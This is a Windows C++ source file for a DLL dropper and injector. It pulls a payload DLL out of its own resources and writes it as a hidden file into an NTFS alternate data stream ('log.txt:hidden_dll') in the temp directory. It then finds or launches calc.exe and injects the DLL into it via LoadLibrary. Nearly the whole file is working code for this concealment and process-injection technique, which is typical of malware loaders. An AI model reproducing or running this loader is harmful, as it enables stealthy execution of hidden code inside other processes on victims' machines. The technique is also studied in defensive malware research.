#include <windows.h>
#include <Shlwapi.h>

#include <stdio.h>

#include "resource.h"

#include "createproc.h"
#include "enumproc.h"
#include "target_util.h"

#include "inject_with_loadlibrary.h"
#include "sysutil.h"

#pragma comment(lib, "Shlwapi.lib")

BYTE* get_raw_payload(OUT SIZE_T &res_size)
{
    HMODULE hInstance = GetModuleHandle(NULL);
    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(MY_RESOURCE), RT_RCDATA);
    if (!res) return NULL;

    HGLOBAL res_handle  = LoadResource(NULL, res);
    if (res_handle == NULL) return NULL;

    BYTE* res_data = (BYTE*) LockResource(res_handle);
    res_size = SizeofResource(NULL, res);

    BYTE* out_buf = (BYTE*) VirtualAlloc(NULL,res_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(out_buf, res_data, res_size);

    FreeResource(res_handle);
    return out_buf;
}

BOOL write_to_file(BYTE* res_data, SIZE_T res_size, WCHAR* payloadName)
{
    HANDLE hFile = CreateFile(payloadName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
    if (hFile == NULL) return FALSE;

    DWORD written = 0;
    BOOL isDropped = WriteFile(hFile, res_data, res_size, &written, NULL);
    CloseHandle(hFile);

    if (isDropped == TRUE) {
        if (res_size != written) { //failed to write full buffer
            DeleteFile(payloadName);
            return FALSE;
        }
    }
    return TRUE;
}

bool drop_dll_to_dir(WCHAR* inject_path)
{
    BYTE* res_data = NULL;
    SIZE_T res_size = 0;

    if ((res_data = get_raw_payload(res_size)) == NULL) {
        printf("Failed!\n");
        return false;
    } 
    printf("inject_path = %S\n", inject_path);

    //drop the DLL on the disk:
    if (!write_to_file(res_data, res_size, inject_path)) return false;
    return true;
}

HANDLE get_target()
{
    WCHAR target_name[] = L"calc.exe";
    HANDLE hProcess = find_running_process(target_name);
    if (hProcess != NULL) {
        return hProcess;
    }
        
    WCHAR target_path[MAX_PATH];
    get_calc_path(target_path, MAX_PATH);
    PROCESS_INFORMATION pi;
    memset(&pi,0, sizeof(PROCESS_INFORMATION));
    create_new_process1(target_path, pi);
    if (pi.hProcess == NULL) {
        return NULL;
    }
    hProcess = pi.hProcess;
    ResumeThread(pi.hThread); //optional
    return hProcess;
}

int main(int argc, char *argv[])
{
    if (!is_compiled_32b()) {
        printf("[ERROR] Not supported! Compile the loader as a 32 bit application!\n");
        system("pause");
        return (-1);
    }
    HANDLE hProcess = get_target();
    if (!hProcess) {
        printf("Could not fetch the target\n");
        system("pause");
        return -1;
    }
    //buffer to store the full path:
    WCHAR inject_path[MAX_PATH];

    //we will drop the dll into ADS:
    WCHAR my_lib[] = L"log.txt:hidden_dll";
    
    WCHAR dir_path[MAX_PATH];
    GetTempPath(MAX_PATH, dir_path);
    PathCombine(inject_path, dir_path, my_lib);

    if (!drop_dll_to_dir(inject_path)) return -1;

   if (!inject_with_loadlibrary(hProcess, inject_path)) {
       //injection failed, delete the dropped dll:
        DeleteFile(inject_path);
        printf("Failed!\n");
    }
    system("pause");
    return 0;
}
